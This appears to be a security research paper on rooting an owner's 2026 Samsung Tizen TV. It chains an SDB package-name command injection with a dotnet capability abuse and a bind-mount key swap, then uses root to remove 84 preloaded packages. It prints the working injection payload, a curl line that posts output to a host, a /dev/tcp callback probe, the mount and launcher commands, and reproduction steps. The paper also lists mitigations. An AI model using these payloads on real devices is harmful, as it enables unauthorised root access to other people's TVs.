#set document(title: "Rooting a 2026 Samsung Tizen 9.0 TV through an SDB package-name injection")
#set page(paper: "a4", margin: (x: 2.4cm, y: 2.5cm), numbering: "1")
#set text(size: 11pt)
#set par(justify: true, leading: 0.65em)
#set heading(numbering: "1.1")
#show heading: set block(above: 1.4em, below: 0.7em)
#show table: set text(size: 9.5pt, hyphenate: false)

#align(center)[
  #text(size: 17pt, weight: "bold")[
    Rooting a 2026 Samsung Tizen 9.0 TV through an SDB package-name injection
  ]
  #v(0.9em)
  18 October 2026
  #v(0.8em)
  Swarnaditya Singh (Independent)
  #h(0.45em) · #h(0.45em)
  DeepSeek V4.1 Flash (OpenCode)
  #v(0.6em)
  #link("https://creativecommons.org/licenses/by/4.0/")[CC BY 4.0]
]

= Abstract

A retail Samsung TV in Developer Mode exposes Samsung's SDB daemon on TCP 26101. The daemon refuses an interactive shell. It still accepts the internal command `0 appinstall tpk <name>`. The daemon writes the name into a shell command without quoting. A backtick substitution in the name runs as `uid=901(sdk)` with the `System` SMACK label. That is SVE-2025-50109 @bishopfox2025sve. The shell cannot exec an unsigned native file. It can pipe a script to `bash`. It can also load managed code through the signed `/usr/bin/dotnet`. That host carries `cap_setgid,cap_sys_admin`. The managed payload makes a private mount namespace. It bind-mounts its own key over the launcher key. The signed launcher then runs the archive script as root. A root agent calls back over an HMAC channel. The controller accepts only `uid==euid==gid==egid==0`. Root is verified. The route is userland only. It needs no kernel bug. It changes no system file. On this target, boot persistence is impossible on the device. `/` and `/prd` are read-only. systemd searches no writable unit directory. A host watchdog re-arms root after each boot in about ten seconds. Root removes 84 preinstalled packages. The package count falls from 511 to 427. No systemd unit fails.

= Introduction

A Samsung TV in Developer Mode runs an SDB daemon on the LAN. The daemon lists packages and uninstalls them. It hides root and an interactive shell. One internal command takes a package name. The name reaches a shell without quoting. The name is an injection point. The injection is public @bishopfox2025sve. The escalation past `uid=901(sdk)` is public too @ritsen2026tvroot. This paper reproduces both on a 2026 model. It records three adaptations. It states the persistence limit. It applies root to bloatware removal.

The paper makes four claims.

+ The public chain works on a 2026 `QA55QEF1AULXL` on Tizen 9.0. Three adaptations are required.
+ The chain is userland. It needs no kernel bug, and it changes no system file.
+ On-device boot persistence is impossible on this target. A host controller provides the persistence.
+ Root removes 84 packages. The count falls from 511 to 427. No systemd unit fails.

The target is a television owned by the first author. Developer Mode was already on. The purpose was to remove preinstalled advertising and telemetry. The foothold is public. The escalation is public. The chain is left volatile. Disabling the controller returns the device to stock behaviour.

= Background

SDB is Samsung Debug Bridge. It reuses an ADB-like wire protocol. A `CNXN` handshake comes first. Then `OPEN`, `OKAY`, `WRTE`, and `CLSE` frames share one multiplexed stream. A raw capture is in Appendix B.

With Developer Mode on, an unprivileged host on the LAN connects. Three commands are supported:

```sh
sdb connect <TV_IP>:26101
sdb -s <TV_IP>:26101 shell 0 applist     # list installed packages
sdb -s <TV_IP>:26101 shell 0 getduid     # device unique id
sdb -s <TV_IP>:26101 uninstall <PKGID>   # remove a store app
```

Every other command returns `closed`. A bare `sdb shell`, `dlog`, and `sdb pull` all return `closed`. This is the intended surface. The TV ships 511 or more packages. Most are `org.tizen.*` and `com.samsung.*` platform code. Few are store apps. The supported surface removes few of them. That is the motivation to go further.

The daemon advertises this capability string:

```
capability: secure_protocol:enabled,sdk_toolpath:/home/owner/share/tmp/sdk_tools,
 appcmd_support:disabled,pkgcmd_debugmode:enabled,sdbd_rootperm:disabled,
 rootonoff_support:disabled,intershell_support:disabled,cpu_arch:armv7,core_abi:arm_32
```

Three flags say the TV gives no shell and no root. `intershell_support:disabled` is one. `sdbd_rootperm:disabled` is another. `rootonoff_support:disabled` is the third. Three more layers restrict code. SMACK is a mandatory-access-control layer, so a compromised SDK process runs with the `System` label. UEP checks the signature of a native file before exec. Tizen rejects an unsigned package.

= Related work

The entry primitive is SVE-2025-50109 @bishopfox2025sve. The advisory reports an SDB package-name command injection. It affects Tizen up to 9.0. It yields `uid=901(sdk)`.

The escalation is the archive-root method of `samsung-tv-root` @ritsen2026tvroot. That project is public and model-independent. It supplies the `dotnet` and `tarlauncher` capability primitive, the mount-namespace key substitution, the HMAC root-agent protocol, and the timing oracle.

CVE-2025-0072 is a Mali GPU use-after-free @cve20250072. Upstream uses it on the QN90F. This work does not.

This paper adds a reproduction on a 2026 `QA55QEF1AULXL`. It adds the three adaptations of @sec-adapt. It adds the persistence analysis of @sec-persist. It adds the debloating result of @sec-apply.

= The device

The device is a retail Samsung `QA55QEF1AULXL` ("Iris"). @tbl-device lists its properties.

#figure(
  table(
    columns: (1fr, 4.2fr),
    align: (left, left),
    inset: 6pt,
    table.header([*Property*], [*Value*]),
    [Device], [Samsung `QA55QEF1AULXL` ("Iris")],
    [Platform], [Tizen 9.0.0 (Tizen9/TV), Linux 5.4.261, `armv7l`],
    [SoC], [4x Cortex-A72 (`0xd08`), platform string `rosel`],
    [Firmware], [`T-RSLFUABC-0090-REL-202608061940`],
    [Network], [TV `10.27.27.3` · SDB `26101` · host `10.27.27.34`],
    [SDB version], [`2.2.31`, plugin `3.8.11_TV_REL`],
    [Result], [`uid=0 euid=0 gid=0 egid=0`, `CapEff=0000003fffffffff`, SMACK `User`],
    [Reversibility], [Volatile. No system file changed. Staging removed and verified.],
  ),
  caption: [The target device.],
) <tbl-device>

The foothold identity is `uid=901(sdk)` with the `System` SMACK label:

```console
$ id
uid=901(sdk) gid=901(sdk) groups=29(audio),44(video),201(display),901(sdk),... context="System"

$ uname -a
Linux Samsung 5.4.261 #1 SMP PREEMPT Sat Jun 27 16:55:17 UTC 2026 armv7l GNU/Linux

$ cat /etc/os-release
NAME=Tizen
VERSION="9.0.0 (Tizen9/TV)"
ID=tizen
VERSION_ID=9.0.0
BUILD_ID=T-RSLFUABC-0090-REL-202608061940
```

Tizen 9.0 is the newest platform generation. SVE-2025-50109 was reported to affect this version range.

= Entry vulnerability

== The bug

SDB accepts one internal command:

```
0 appinstall tpk <package-name>
```

The install path writes `<package-name>` into a shell command. It does not quote the name. Any shell metacharacter in the name is evaluated. Backtick substitution is the cleanest primitive. The TV-side filter does not block it on this path. A push-side `sdb install` sweep is misleading. The `shell` to `appinstall` path is the one that matters.

== The payload

Literal spaces are filtered, so `${IFS}` supplies whitespace. The script is base64-encoded to dodge quoting.

```console
0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}L2Jpbi9ta2RpciAvdG1wL3MtMDEyMzQ1Njc4OWFiY2RlZiAyPi9kZXYvbnVsbCYmeyBjYXQgL2hvbWUvb3duZXIvc2hhcmUvdG1wL3Nka190b29scy9yZWNvbi5zaCB8IC9iaW4vYmFzaDt9|base64${IFS}-d|bash`.tpk
```

The argument base64-decodes to:

```sh
/bin/mkdir /tmp/s-0123456789abcdef 2>/dev/null&&{ cat /home/owner/share/tmp/sdk_tools/recon.sh | /bin/bash;}
```

The `mkdir` gate makes the payload idempotent. It also gives an observable side effect, since there is no output channel. The whole argument must stay 510 bytes or less. That is the `appinstall` limit. A longer command is staged as a file and fetched with `cat ... | bash`.

== The timing oracle

The daemon replies `closed` whether or not the injection ran. The reply is not a rejection. Two injections prove execution by wall-clock time. @tbl-oracle lists them. The measured delta was at least 1.5 seconds. The delay probe took about 2.21 seconds. The injected text runs. This is the same oracle upstream uses.

#figure(
  table(
    columns: (1fr, 2fr, 2fr),
    align: (left, left, left),
    inset: 6pt,
    table.header([*Probe*], [*Substituted command*], [*Expected*]),
    [control], [`/bin/true`], [fast],
    [delayed], [`/bin/sleep 2`], [about 2 s slower],
  ),
  caption: [The timing oracle. A delta of at least 1.5 s proves the injected text runs.],
) <tbl-oracle>

== Output channel

There is no stdout back to the host. Results leave the TV over TCP:

```sh
cat /path/script.sh | /bin/bash 2>&1 | curl -s -m 15 -X POST --data-binary @- http://<HOST>:8000/<tag>
```

On the TV, `curl`, `bash`, `sh`, `tar`, `openssl`, `unshare`, and `nsenter` are present. `wget`, `nc`, `busybox`, `python3`, `timeout`, `su`, and `sudo` are not. Bash `/dev/tcp` is a fallback transport.

== The UEP wall

UEP blocks execution of an unsigned native file:

```
[uep][bash] the file is NOT signed!! : /path/to/script.sh
```

Two workarounds matter. First, pipe the file to the interpreter. `cat script.sh | bash` works, because no unsigned file reaches `execve`. Second, run managed code through a signed host. `/usr/bin/dotnet` carries file capabilities. A managed assembly is data to an already-trusted binary. This is the key to the root route.

= The archive-root chain

== Reconnaissance

The full capture is in `evidence/recon-as-sdk.txt`. @tbl-caps lists the capability-bearing binaries.

#figure(
  table(
    columns: (1.5fr, 3.5fr),
    align: (left, left),
    inset: 6pt,
    table.header([*Binary*], [*Capabilities*]),
    [`/usr/bin/dotnet`], [`cap_setgid, cap_sys_admin=ei` *(the lever)*],
    [`/usr/sbin/sdbd-tarlauncher`], [`cap_setgid, cap_setuid=eip` *(the root executor)*],
    [`/usr/bin/dotnet-launcher`], [`cap_setgid, cap_setuid, cap_setpcap, cap_sys_chroot, cap_sys_ptrace, cap_sys_admin, cap_sys_nice, cap_mac_override, cap_mac_admin=ei`],
    [`/usr/bin/launchpad-starter`], [`cap_chown, cap_fowner, cap_setgid, cap_setuid, cap_setpcap, cap_sys_chroot, cap_sys_ptrace, cap_sys_admin, cap_sys_nice, cap_mac_override, cap_mac_admin=eip`],
  ),
  caption: [Capability-bearing binaries on the target.],
) <tbl-caps>

Namespace support is present, and the mount trick needs it:

```console
$ unshare -m -U /bin/true && echo NS_OK
NS_OK
```

World-writable device nodes are an unused attack surface:

```
crw-rw-rw- 1 root root     10, 193  /dev/sdp_mem       # physical-memory style device
crw-rw-rw- 1 root video    10,  51  /dev/tzmem         # TEE memory
crw-rw-rw- 1 root display  10,  45  /dev/mali0         # Mali GPU
crw-rw-rw- 1 root root     89,   N  /dev/i2c-*         # i2c buses
crw-rw-rw- 1 root root    244,   0  /dev/eeprom
crw-rw---- 1 root log       1,  11  /dev/kmsg          # sdk is in group log
```

`/dev/sdp_mem` is a 0666 physical-memory-style node. It is analogous to `/dev/sdp_pqe_fdet`, which upstream uses on the QN90B. A read can block, so any probe must be defensive. This work does not use the path, because the archive-root route needs no kernel primitive.

The device ships a .NET 6 runtime:

```
/usr/share/dotnet/shared/Microsoft.NETCore.App/6.0.9/
```

`/` is `vdfs ro`. `/tmp` is `tmpfs rw`. `/opt` is `vdfs rw`. The staging directory `/home/owner/share/tmp/sdk_tools` is world-writable.

== The chain

*Step 1.* `/usr/bin/dotnet` carries `cap_setgid,cap_sys_admin=ei`. A managed assembly runs inside that process, so the CLR runs with `CAP_SYS_ADMIN` effective. A small payload reads `/proc/self/status`. It confirms bits `(1<<6)|(1<<21)`, which are `CAP_SETGID` and `CAP_SYS_ADMIN`.

*Step 2.* The payload calls `unshare(CLONE_NEWNS)`. It remounts `/` as `MS_REC|MS_PRIVATE`. Mount changes are then invisible to the rest of the system.

*Step 3.* The payload bind-mounts two files inside the namespace:

```c
mount("<staging>/public.pem", "/usr/share/sdbd/public.pem", NULL, MS_BIND, NULL);
mount("<staging>/passwd",     "/etc/passwd",                NULL, MS_BIND, NULL);
```

The launcher now verifies against the key we own.

*Step 4.* A `tar.gz` holds a `launch.sh`. It is signed with a fresh RSA-2048 key. The public half is the `public.pem` of Step 3. The signed launcher holds `cap_setgid,cap_setuid=eip`. It is invoked:

```
/usr/sbin/sdbd-tarlauncher --package_name <package> -xzf <staging>/on-demand/<package>.tar.gz --to-command=/bin/sh
```

It verifies the archive against the mounted key. It accepts the archive. It runs `launch.sh` as root.

*Step 5.* `launch.sh` execs a second managed assembly:

```sh
#!/bin/sh
exec /usr/bin/dotnet <staging>/SamsungTvRootAgent.dll <HOST> <PORT> <staging>/root-agent.token <staging>
```

The agent connects back to the host controller.

== The protocol

The agent server sends a 32-byte nonce. Each frame is `<payload>\t<hmac-sha256(secret, nonce||0x00||payload)>`. The controller runs a session only if the peer reports `uid==euid==gid==egid==0`. An unprivileged process cannot spoof the root evidence.

== Result

@tbl-root lists the result.

#figure(
  table(
    columns: (1.2fr, 3.8fr),
    align: (left, left),
    inset: 6pt,
    table.header([*Property*], [*Value*]),
    [Identity], [`uid=0 euid=0 gid=0 egid=0`],
    [Capabilities], [`0000003fffffffff`],
    [SMACK label], [`User`],
    [Runtime], [.NET 6.0],
    [Shadow read], [`/etc/shadow` (mode `0000`) readable],
    [Root write], [root-owned directory write returns `ROOT_WRITE_OK`],
    [System files], [unchanged (`system_files_unchanged: true`)],
    [Staging], [removed and verified (`staging_cleaned: true`)],
  ),
  caption: [Verified root. The agent authenticated over the HMAC channel and returned `uid=0`.],
) <tbl-root>

Root commands:

```console
$ id
uid=0(owner) gid=0(root) groups=0(root),29(audio),44(video),201(display),1901(log),... context="User"

$ ls -la /etc/shadow && head -c 200 /etc/shadow
---------- 1 owner root 2177 2026-08-06 16:41 /etc/shadow
root:*:20063:0:99999:7:::

$ P=/opt/usr/.root-proof-$$; echo proof > $P && ls -la $P && rm -f $P && echo ROOT_WRITE_OK
-rw-rw-rw- 1 owner root 6 2026-10-18 20:44 /opt/usr/.root-proof-24824
ROOT_WRITE_OK

$ cat /etc/passwd
owner:x:0:0:owner:/home/owner:/bin/sh
```

`/usr/share/sdbd/public.pem` hashed to the generated key, not Samsung's key. The bind mount took effect. The tool reported `system_files_unchanged: true` and `staging_cleaned: true`.

= Reproducing: adaptations <sec-adapt>

The public tooling worked. This 2026 `rosel` TV needed three adaptations. They are likely to recur.

== Samsung's dotnet is a stripped host

`/usr/bin/dotnet` is a 13,880-byte launcher. It is not the upstream .NET host. It does not support `--list-runtimes` or `--info`:

```
$ /usr/bin/dotnet --list-runtimes
Unknown option --list-runtimes.
Usage: dotnet [options] [path-to-executable] [arguments]
Options:
--clr-path <path>   path to libcoreclr.so and runtime assemblies
```

The upstream preflight calls `--list-runtimes`, so it aborts here. The runtime is known to be 6.0.9. The driver replaces `_check_target` with a capability and hash check. It pins `runtime=6.0`.

== Assemblies under /tmp fail to load

The host runs assemblies from `/opt/usr/dotnet` and from `/home/owner/share/tmp/sdk_tools`. Any DLL under `/tmp` fails:

```
$ /usr/bin/dotnet /tmp/x/SamsungTvArchiveRoot.dll
The specified file does not exist.       # even though the file is right there
$ /usr/bin/dotnet /home/owner/share/tmp/sdk_tools/x/SamsungTvArchiveRoot.dll
# loads correctly
```

A Samsung-shipped DLL copied into `/tmp` also fails. The same DLL in sdk_tools works. The archive-root staging is `/home/owner/share/tmp/sdk_tools/<package>`, so the consequence is harmless there. A payload staged in `/tmp` fails.

== Callback reachability

The exploit is callback-based. The TV opens an inbound TCP connection to the controller. Our host firewall dropped all ports except 8000. That looked like a failed injection. Two listeners were pinned to open ports: the capture listener to `45777`, and the root-agent listener to `8000`. The lesson is to test the callback path alone. A listener plus `bash -c 'exec 3<>/dev/tcp/<HOST>/<PORT>'` on the TV separates a firewall block from a failed exploit. The TV has no `timeout`, so a probe must not use one.

= Results

@tbl-eval lists the verified properties. The chain is userland. It composes a command injection, a capability-bearing interpreter, a private mount namespace, a signature-verification confusion, and an authenticated reverse agent. No kernel bug is involved. No memory corruption is involved. No cryptographic break is involved.

#figure(
  table(
    columns: (2fr, 3fr),
    align: (left, left),
    inset: 6pt,
    table.header([*Property*], [*Observation*]),
    [Resulting identity], [`uid=0 euid=0 gid=0 egid=0`, SMACK `User`],
    [Effective capabilities], [`0000003fffffffff`],
    [Privileged reads], [`/etc/shadow` (mode `0000`) readable],
    [Privileged writes], [root-owned directories writable],
    [Protocol authenticity], [HMAC-SHA256 over a per-session nonce],
    [System files modified], [none],
    [Staging left behind], [none],
    [Time to root], [about 9 to 11 s from controller start],
    [Pivot primitive], [none beyond vendor-signed binaries],
  ),
  caption: [Evaluation of the chain.],
) <tbl-eval>

= Persistence <sec-persist>

The route is non-persistent on the device. The mount namespace dies with the payload process. The root agent is a child process, and it exits after the session. No system file changes. The tool hashes `/etc/passwd` and `/usr/share/sdbd/public.pem` before and after. It asserts they are unchanged. All staging is deleted, and the deletion is verified. A reboot clears everything.

Upstream describes an "always rooted" mode. That mode comes from an external controller that re-runs the injection after each boot. It does not come from on-device persistence. That was verified directly on this TV, and a controller was then built.

== On-device persistence is impossible here

A search was made for a writable location that runs at boot. There is none. @tbl-persist lists four independent reasons.

1. The boot hooks are on read-only partitions. `/` is `vdfs ro`, 1.4 G, 100 percent used. `/prd` is `vdfs ro`, 53 M, 100 percent used.

```text
/dev/root     on /     type vdfs (ro,relatime,posixacl)
/dev/subroot2 on /prd  type vdfs (ro,relatime,posixacl)
/dev/mmcblk0p20 on /mnt/systemrw type vdfs (rw,noatime,posixacl,dncs)
/dev/mmcblk0p21 on /opt        type vdfs (rw,noatime,posixacl,dncs)
```

The only writable persistent areas are `/opt` and `/mnt/systemrw`. `/tmp`, `/run`, and `/var/run` are tmpfs.

2. systemd has no writable unit directory on its path. PID 1 is systemd 244. It reports:

```text
UnitPath=/etc/systemd/system /run/systemd/system /run/systemd/generator
         /usr/lib/systemd/system /prd/usr/lib/systemd/system
         /run/systemd/generator.late
```

Every entry except the `/run` generators is on a read-only partition. `/opt` and `/mnt/systemrw` are not searched. A probe unit was dropped into `/opt/etc/systemd/` and into `/opt/usr/share/systemd/system/`. Both are writable. `systemctl daemon-reload` ran. The unit was not found: `found: 0` in each case. The units that watch writable paths, such as `tts-download-service.path` and `vdtizen-bootseq-*.path`, trigger fixed signed binaries. None runs a script from a writable directory.

3. Unsigned code does not run. UEP rejects an unsigned native executable. Tizen refuses an unsigned package. The only unsigned primitive is managed code through the signed `/usr/bin/dotnet`. It still needs an invocation, and that needs a boot hook.

4. Writable boot state is volatile. `/run/systemd/system` is on the unit path and writable. It is tmpfs. Anything there is gone after the next boot.

Persistence here cannot be "drop a file and forget it". It must be re-armed from outside the TV after every boot. Upstream does exactly that.

#figure(
  table(
    columns: (1.6fr, 3.4fr),
    align: (left, left),
    inset: 6pt,
    table.header([*Barrier*], [*Evidence*]),
    [Read-only boot parts], [`/` and `/prd` are `vdfs ro`, 100 percent used],
    [No writable unit dir], [probe unit in `/opt/...` gives `found: 0`],
    [UEP signature check], [unsigned native exec rejected],
    [Volatile boot state], [`/run/systemd/system` is tmpfs],
  ),
  caption: [Four independent barriers to on-device boot persistence.],
) <tbl-persist>

== The host controller

`tools/tv-rootwatch.sh` re-arms root. sdbd exists only while the TV runs, so the watchdog polls TCP `10.27.27.3:26101` every 5 s. A reachable to unreachable to reachable transition means a reboot. On startup and on every transition it runs the exploit through `tools/tv-root-run.py`. That wrapper pins the two open ports and the 6.0 preflight. Success is recorded only if the agent authenticated and returned `uid=0`. The kernel `boot_id` is logged.

`tools/tv-root-run.py` also runs a one-off command:

```sh
TV=10.27.27.3 HOST=10.27.27.34 ./tools/tv-root-run.py 'id' 'ls -la /opt'
```

It runs as a user systemd service. Host root is not required. `loginctl enable-linger` keeps it after logout:

```sh
systemctl --user enable --now tv-rootwatch.service
loginctl enable-linger "$USER"
systemctl --user status  tv-rootwatch.service
journalctl --user -u tv-rootwatch.service -f
```

From a fresh start the watchdog had an authenticated `uid=0` agent about nine seconds later. A later run completed re-root and debloat re-application in 11 s. To undo it:

```sh
systemctl --user disable --now tv-rootwatch.service
rm ~/.config/systemd/user/tv-rootwatch.service
```

The watchdog changes nothing on the TV. It re-runs the same volatile exploit, so disabling it returns the device to the state above.

= Application: debloating <sec-apply>

Root exposes two mechanisms that the supported surface hides.

`pkgcmd -u -n <pkgid>` uninstalls as root. It bypasses the `can not uninstall app` lock and the dependency lock that `sdb uninstall` hits. The firmware then drops a kill-switch marker at `/opt/usr/share/systemd/system/<name>`. Most service units test that path with `ConditionPathExists=!/opt/usr/share/systemd/system/<name>`. The service then refuses to start. Some units use a marker name that differs from the package name. `canalysis-daemon`, `pisa-service`, and `ghdaemon` are examples. Those markers are written by hand.

`pkgcmd -D -n <pkgid>` deactivates a package without uninstalling it. That is the reversible disable.

`/opt/usr/share/systemd/system/` is on the writable `/opt` partition, so the markers survive a reboot. Some services have no marker. `data-service`, `sp-kpi`, and `media-analytics-service` are examples. They are stopped and masked in `/run/systemd/system`. That path is tmpfs, so the watchdog re-applies those masks after each boot.

@tbl-debloat lists the result.

#figure(
  table(
    columns: (2.4fr, 1fr, 1fr),
    align: (left, right, right),
    inset: 6pt,
    table.header([*Metric*], [*Before*], [*After*]),
    [Installed packages], [511], [*427*],
    [Direct removals], [—], [65],
    [Removals with dependants], [—], [*84*],
    [Running services], [146], [138],
    [Failed systemd units], [0], [*0*],
  ),
  caption: [Debloat result. Nothing in the keep set was removed.],
) <tbl-debloat>

The removal groups are advertising, ACR, telemetry, promotional autostart, gaming, Bixby/Alexa/voice, SmartThings/IoT, Samsung Health, and Art/Ambient extras. Core function was kept and re-checked. YouTube, Privacy Choices, the store, the browser, and all DRM remain. All `org.tizen.*` core remains. `com.samsung.tv.coba.*` (home UI) and `com.samsung.tv.home.*` (home tabs) remain. `display-manager`, the launcher, and security services came up. The exact set is in the project README and in `tools/tv-debloat-apply.sh`.

= Analysis

The chain is short and needs no memory bug. Each link is a vendor feature used out of context.

The entry bug is a missing quote. The quote is the whole fix at that link. The escalation is not a broken key. The launcher verifies the archive correctly. The key is replaced before verification. A caller that controls a mount namespace can replace the anchor. The fix is to pin the anchor to a file the caller cannot redirect.

Persistence is a property of the target, not of the chain. The chain is volatile. The host controller is durable because it lives on another machine. On this target that is the only durable option.

Debloating shows that root is not only for persistence. The vendor's own kill-switch markers make a removal durable. Root turns a locked preload into a normal uninstall.

= Limitations

The foothold needs Developer Mode, which the owner enables. The daemon is LAN-only. This is not an internet compromise. The realistic attacker is a hostile device on the same L2 network, or a process that reaches `localhost:26101`.

The reproduction covers one model and one firmware. The adaptations may differ on another platform string. The persistence result is specific to this mount topology and this systemd unit path. Another model may have a writable unit directory. The finding is "not possible here", not "not possible anywhere".

The debloat result is one device, and the counts are point-in-time. A firmware update may restore preloads. The root tests read `/etc/shadow` and wrote a root-owned file. They did not test every privilege.

The controller needs the host online at boot. Root is present only after the watchdog re-arms, so a boot with no host has no root.

= Mitigations

For the vendor:

+ Quote or sanitise the package name in the `appinstall` path. Reject the shell metacharacters. This is the direct fix for SVE-2025-50109.
+ Do not let the launcher key be overridable by a bind mount. Verify against a key that a caller-controlled namespace cannot replace, or open the key through an fd that cannot be redirected. This is what turns `CAP_SYS_ADMIN` in any local process into root.
+ Drop file capabilities from a general-purpose runtime. `/usr/bin/dotnet` should not carry `cap_sys_admin`. Move the privileged work into a small helper.
+ Tie SDB to Developer Mode and a trusted host. Treat `intershell_support:disabled` as "not yet enabled", not as "not reachable".

For the owner:

+ Turn Developer Mode off when it is not needed. It removes the SDB surface.
+ Put the TV on a separate VLAN or IoT SSID from general-purpose devices.
+ Block the preload and ad endpoints at DNS. `osb-*.samsungqbe.com` and the ACR and log endpoints are examples. This stops a removed app such as TV Plus from returning.

= Conclusion

A retail 2026 Samsung Tizen 9.0 TV was rooted from an SDB package-name injection. The escalation used the public archive-root chain. It needed no kernel bug, and it changed no system file. Three adaptations were required on this model. On this target, boot persistence is impossible on the device, so a host watchdog re-arms root after each boot in about ten seconds. Root removed 84 packages. The package count fell from 511 to 427, and no systemd unit failed. The firmware's own kill-switch markers make those removals durable. The supported surface stays the baseline. The archive-root chain is the split for an owner who needs root and accepts a host controller.

= Appendix A: exact injection

```
0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<BASE64>|base64${IFS}-d|bash`.tpk
```

The decoded script prefix is the idempotency gate:

```sh
/bin/mkdir /tmp/s-<16 hex> 2>/dev/null&&{ <command>;}
```

= Appendix B: raw SDB wire protocol

Handshake (host to device to host):

```
> CNXN  \x00\x00\x10\x00  host::\x00
< CNXN  device::QA55QEF1AULXL::0\x00
> OPEN  ... capability:\x00
< OKAY  ...
< WRTE  ... secure_protocol:enabled\n
> OPEN  ... shell:0 applist\x00
```

The metacharacter filter is TV-side, and it answers `CLSE` (connection close) when it rejects. The raw capture is in `evidence/sdb-protocol-capture.txt`.

= Appendix C: reproducing

```sh
# 0. prerequisites: Samsung sdb (v4.2.x), Python 3, openssl, .NET 6 SDK
git clone https://github.com/chris-ritsen/samsung-tv-root
cd samsung-tv-root
make common-payload DOTNET=/usr/sbin/dotnet      # builds payloads/common/out/*.dll

# 1. TV in Developer Mode, host IP registered, TV reachable on 26101
sdb connect <TV_IP>:26101

# 2. verify the injection works (timing oracle) and that the callback path is open
#    see do_root.py in evidence/ for the full driver
```

The driver used here (`do_root.py`) monkey-patches only what @sec-adapt requires:

+ `_check_target` skips `--list-runtimes` and detects the runtime as `6.0`.
+ `SdbClient.capture` pins the capture listener to a firewalled-open port (`45777`).
+ `RootAgentServer` pins the root-agent listener to an open port (`8000`).

Everything else is upstream code.

#bibliography("refs.bib", style: "ieee")
